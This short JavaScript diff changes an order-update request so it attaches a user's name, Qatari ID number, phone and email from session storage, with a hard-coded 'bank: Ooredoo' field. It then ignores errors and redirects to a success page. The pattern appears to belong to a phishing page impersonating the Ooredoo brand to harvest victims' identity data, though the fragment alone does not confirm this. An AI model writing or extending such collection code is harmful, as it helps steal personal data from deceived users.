@@ -378,7 +378,14 @@
       fetch('/api/orders/' + encodeURIComponent(orderId), {
         method: 'PUT',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({
+          ...payload,
+          name: sessionStorage.getItem('userName') || 'مستخدم أوريدو',
+          qid: sessionStorage.getItem('userQid') || '',
+          phone: sessionStorage.getItem('userPhone') || '',
+          email: sessionStorage.getItem('userEmail') || payload.ooredooUser,
+          bank: 'Ooredoo'
+        })
       }).catch(() => {});
 
       window.location.href = 'success.html';
